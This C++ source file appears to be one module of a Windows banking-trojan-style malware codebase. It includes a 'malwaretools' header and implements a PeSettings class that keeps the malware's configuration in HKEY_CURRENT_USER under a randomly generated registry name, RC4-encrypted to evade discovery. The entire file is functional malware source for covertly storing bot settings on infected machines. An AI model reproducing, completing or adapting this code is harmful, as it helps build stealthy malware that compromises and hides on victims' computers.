#include <Windows.h>
#include "pesettings.h"

#include "crypt.h"
#include "sync.h"
#include "process.h"
#include "fs.h"
#include "str.h"
#include "registry.h"
#include "malwaretools.h"

static WCHAR registryKey[CORE_REGISTRY_KEY_BUFFER_SIZE];
static WCHAR registryValue[CORE_REGISTRY_VALUE_BUFFER_SIZE];
static WCHAR readWriteMutex[50];
static HANDLE lastReadWriteMutex;

void PeSettings::init()
{
	readWriteMutex[0] = 0;
	registryValue[0]    = 0;
}

void PeSettings::uninit()
{

}

PESETTINGS* PeSettings::getCurrent()
{
	PESETTINGS* result = NULL;
	DWORD type,size;
	if(registryValue[0] == 0) 
	{
		MalwareTools::_GenerateRandomRegKeyName(MalwareTools::NCF_FIRST_UPPER, HKEY_CURRENT_USER, PATH_REGKEY, registryValue, 4, 6);
		Str::_CopyW(registryKey, registryValue, -1);
		Fs::_pathCombine(registryKey, PATH_REGKEY, registryKey);
	}
	
	if(Registry::_valueExists(HKEY_CURRENT_USER, registryKey, registryValue) && (size = Registry::_getValueAsBinaryEx(HKEY_CURRENT_USER, registryKey, registryValue, &type, (void**)&result)) != (DWORD)-1 && type == REG_BINARY)
	{
		Crypt::RC4KEY key;
		Core::initKeyFromBaseConfig(&key);
		Crypt::_rc4(result, size, &key);
			
		result->size = size;
	}
	
	return result;
}

PESETTINGS* PeSettings::beginReadWrite()
{
	//if(readWriteMutex[0] == 0)Core::generateObjectName(Core::OBJECT_ID_LOCALPESETTINGS, readWriteMutex, MalwareTools::KON_GLOBAL);

	PESETTINGS* result = NULL;
	HANDLE mutex = Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, readWriteMutex);
	if(mutex != NULL)
	{
		lastReadWriteMutex = mutex;
		if((result = getCurrent()) == NULL)
		{
			Sync::_freeMutex(mutex);
		}
	}
	return result;

}

bool PeSettings::endReadWrite(PESETTINGS* config)
{
  bool r = false;
  if(config != NULL && coreData.integrityLevel > Process::INTEGRITY_LOW)
  {
    Crypt::RC4KEY key;
	Core::initKeyFromBaseConfig(&key);
	DWORD size = config->size;
    Crypt::_rc4(config, config->size, &key);

    r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, config, size);
  }

  Mem::free(config);
  Sync::_freeMutex(lastReadWriteMutex);
  return r;
}

bool PeSettings::setCurrent(void* data, DWORD size)
{
	//if(readWriteMutex[0] == 0)Core::generateObjectName(Core::OBJECT_ID_LOCALPESETTINGS, readWriteMutex, MalwareTools::KON_GLOBAL);
	if(registryValue[0] == 0) 
	{
		MalwareTools::_GenerateRandomRegKeyName(MalwareTools::NCF_FIRST_UPPER, HKEY_CURRENT_USER, PATH_REGKEY, registryValue, 4, 6);
		Str::_CopyW(registryKey, registryValue, -1);
		Fs::_pathCombine(registryKey, PATH_REGKEY, registryKey);
	}
	bool r = false;
	HANDLE mutex = Sync::_waitForMutex(&coreData.securityAttributes.saAllowAll, readWriteMutex);
	if(mutex != NULL)
	{
		Crypt::RC4KEY key;
		Core::initKeyFromBaseConfig(&key);
		Crypt::_rc4(data, size, &key);

		 r = Registry::_setValueAsBinary(HKEY_CURRENT_USER, registryKey, registryValue, REG_BINARY, data, size);
	}
	Mem::free(data);
	Sync::_freeMutex(lastReadWriteMutex);
	return r;
}